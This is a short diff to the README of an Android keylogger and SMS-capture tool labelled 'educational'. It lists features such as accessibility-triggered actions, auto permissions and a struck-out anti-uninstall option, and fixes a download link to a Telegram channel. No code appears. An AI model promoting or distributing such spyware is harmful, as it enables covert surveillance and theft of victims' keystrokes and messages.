@@ -12,7 +12,7 @@ Android KeyLogger and SMS Capture (software is meant for educational)
 * Choose the Activity Main method when accessibility is Enabled (HTML File, WebView, OpenLink, Open Another App, Toast Message)
 * Auto Permissions
 * ~~AntiUninstall~~
-## [Download][
+## [Download]
 https://t.me/irarechannel/67
 
 ## Requisites
